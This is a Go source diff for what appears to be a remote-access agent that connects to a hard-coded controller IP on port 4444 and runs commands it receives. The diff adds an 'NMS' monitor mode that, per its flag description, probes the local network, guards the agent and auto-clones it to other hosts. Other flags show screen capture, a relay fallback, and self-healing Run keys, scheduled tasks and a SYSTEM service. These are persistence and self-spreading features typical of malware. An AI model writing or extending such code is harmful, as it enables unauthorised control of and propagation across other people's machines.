@@ -10,6 +10,7 @@ import (
 	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
+	"errors"
 	"flag"
 	"fmt"
 	"image"
@@ -267,6 +268,11 @@ func captureImage(quality, monitor int, all bool, scale float64) (data []byte, w
 }
 
 func captureScreen() ([]byte, int, int, error) {
+	// NMS-owned sleep: no captures while asleep (callers already treat
+	// empty as heartbeat, so the stream idles instead of dying).
+	if commands.SleepCheckCached() {
+		return nil, 0, 0, nil
+	}
 	data, w, h, _, _, _, err := captureImage(0, 0, false, 0)
 	return data, w, h, err
 }
@@ -2597,6 +2603,180 @@ func setupLogFile() {
 	dlog.SetOutput(df)
 }
 
+// nmsControllerIPs seeds the NMS exclusion list: the controller is never
+// a clone target (cloning it would fork the fleet brain).
+func nmsControllerIPs(ctrlAddr string) []string {
+	out := []string{"176.229.98.54"}
+	if h, _, err := net.SplitHostPort(ctrlAddr); err == nil && h != "" {
+		dup := false
+		for _, e := range out {
+			if e == h {
+				dup = true
+			}
+		}
+		if !dup {
+			out = append(out, h)
+		}
+	} else if ctrlAddr != "" {
+		out = append(out, ctrlAddr)
+	}
+	return out
+}
+
+// runNMS is the NMS monitor main loop (never returns except on ordered
+// stop or update). Transport mirrors the agent's dial sequence; the loop
+// body is commands.StepNMS, which ALSO runs while the controller is
+// unreachable (send=nil drops reports, guard/probe continue) — a dead
+// controller never stops the monitor.
+func runNMS(ctrlAddr, caFile string, insecure bool) {
+	_ = os.WriteFile(commands.NMSPidPath(), []byte(fmt.Sprintf("%d", os.Getpid())), 0644)
+	defer os.Remove(commands.NMSPidPath())
+	ctrlIPs := nmsControllerIPs(ctrlAddr)
+	backoff := time.Second
+	const maxBackoff = time.Minute
+	for {
+		err := nmsSession(ctrlAddr, caFile, insecure, ctrlIPs)
+		if errors.Is(err, commands.ErrNMSShutdown) {
+			log.Printf("[nms] ordered stop, exiting")
+			return
+		}
+		if errors.Is(err, commands.ErrNMSUpdate) {
+			log.Printf("[nms] %v, exiting for restart on new bytes", err)
+			os.Exit(0)
+		}
+		if err != nil {
+			log.Printf("[-] NMS session ended: %v", err)
+		}
+		// Controller unreachable: local cycle anyway (guard/probe have no
+		// network dependency except reporting), then redial with backoff.
+		if serr := commands.StepNMS(nil, ctrlIPs); errors.Is(serr, commands.ErrNMSShutdown) {
+			log.Printf("[nms] ordered stop, exiting")
+			return
+		} else if errors.Is(serr, commands.ErrNMSUpdate) {
+			log.Printf("[nms] %v, exiting for restart on new bytes", serr)
+			os.Exit(0)
+		}
+		time.Sleep(backoff)
+		backoff *= 2
+		if backoff > maxBackoff {
+			backoff = maxBackoff
+		}
+	}
+}
+
+// nmsSession dials once, hellos with role=nms, then ticks until the conn
+// dies or the loop orders stop/update.
+func nmsSession(ctrlAddr, caFile string, insecure bool, ctrlIPs []string) error {
+	var tlsCfg *tls.Config
+	if insecure {
+		tlsCfg = &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
+	} else {
+		caData, err := os.ReadFile(caFile)
+		if err != nil {
+			return fmt.Errorf("read ca %s: %w", caFile, err)
+		}
+		pool := x509.NewCertPool()
+		if !pool.AppendCertsFromPEM(caData) {
+			return fmt.Errorf("failed to parse CA cert %s", caFile)
+		}
+		tlsCfg = &tls.Config{RootCAs: pool, MinVersion: tls.VersionTLS12}
+	}
+	uniqAddrs := dialAddrs(ctrlAddr, loadHouses())
+	if lg := loadLastGood(); lg != "" {
+		uniqAddrs = append([]string{lg}, uniqAddrs...)
+		seen := map[string]bool{}
+		dedup := uniqAddrs[:0]
+		for _, x := range uniqAddrs {
+			if !seen[x] {
+				seen[x] = true
+				dedup = append(dedup, x)
+			}
+		}
+		uniqAddrs = dedup
+	}
+	conn, dialAddr, err := raceDials(uniqAddrs, tlsCfg, insecure, caFile)
+	if err != nil {
+		return err
+	}
+	defer conn.Close()
+	saveLastGood(dialAddr)
+	log.Printf("[nms] connected to %s", dialAddr)
+	var encMu sync.Mutex
+	enc := json.NewEncoder(conn)
+	send := func(m protocol.Message) error {
+		encMu.Lock()
+		defer encMu.Unlock()
+		return enc.Encode(m)
+	}
+	hn, user := hostnameAndUser()
+	hello := helloMsg(hn, user)
+	hello.Role = "nms"
+	if err := send(hello); err != nil {
+		return fmt.Errorf("send connect: %w", err)
+	}
+	var alive atomic.Bool
+	alive.Store(true)
+	readerDone := make(chan error, 1)
+	go func() {
+		scanner := bufio.NewScanner(conn)
+		scanner.Buffer(make([]byte, 64*1024), 2*1024*1024)
+		for scanner.Scan() {
+			line := scanner.Bytes()
+			if len(line) == 0 {
+				continue
+			}
+			var msg protocol.Message
+			if err := json.Unmarshal(line, &msg); err != nil {
+				continue
+			}
+			switch msg.Type {
+			case protocol.TypeConnected:
+				log.Printf("[nms] controller acknowledged id=%s", msg.ID)
+			case protocol.TypeCommand:
+				go func(m protocol.Message) {
+					cmdName := strings.TrimSpace(m.Cmd)
+					args := ""
+					if idx := strings.Index(cmdName, " "); idx != -1 {
+						args = strings.TrimSpace(cmdName[idx+1:])
+						cmdName = strings.TrimSpace(cmdName[:idx])
+					}
+					res, rerr := commands.NMSHandle(cmdName, args, ctrlIPs)
+					errStr := ""
+					if rerr != nil {
+						errStr = rerr.Error()
+						if res == "" {
+							res = errStr
+							errStr = ""
+						}
+					}
+					_ = send(protocol.Message{Type: protocol.TypeOutput, Result: res, Error: errStr, CmdID: m.CmdID})
+				}(msg)
+			}
+		}
+		alive.Store(false)
+		readerDone <- scanner.Err()
+	}()
+	for alive.Load() {
+		sendFn := func(j string) {
+			_ = send(protocol.Message{Type: protocol.TypeHealth, Result: j})
+		}
+		if err := commands.StepNMS(sendFn, ctrlIPs); err != nil {
+			return err
+		}
+		cfg := commands.LoadNMSConfig()
+		interval := time.Duration(cfg.IntervalSec) * time.Second
+		if interval < 10*time.Second {
+			interval = 10 * time.Second
+		}
+		select {
+		case rerr := <-readerDone:
+			return rerr
+		case <-time.After(interval):
+		}
+	}
+	return <-readerDone
+}
+
 func main() {
 	addr := flag.String("controller", "176.229.98.54:4444", "controller address host:port")
 	caFile := flag.String("ca", "certs/server.crt", "CA cert file (server.crt)")
@@ -2608,6 +2788,7 @@ func main() {
 	ntfyOnly := flag.Bool("ntfy-only", false, "REMOVED in v1.45 (ntfy relay deleted); accepted and ignored")
 	mqttOnly := flag.Bool("mqtt-only", false, "skip direct dials, use MQTT relay only")
 	watchMode := flag.Bool("watch", false, "run as supervisor: keep the agent alive, no network")
+	nmsMode := flag.Bool("nms", false, "run as NMS monitor: probe LAN, guard agent, auto-clone (own controller row)")
 	wmiHeal := flag.Bool("wmi-heal", false, "repair tasks+Run keys from local XMLs and exit (WMI timer target)")
 	svcHeal := flag.Bool("svc-heal", false, "run as SYSTEM repair service (repairs only, never the agent)")
 	testOnly := flag.Bool("test", false, "dial controller once, print result, exit")
@@ -2665,6 +2846,10 @@ func main() {
 	}
 	if *watchMode {
 		runWatch()
+		return
+	}
+	if *nmsMode {
+		runNMS(*addr, *caFile, *insecure)
 		return
 	}
 	// Self-apply a staged update when running elevated (standard-user
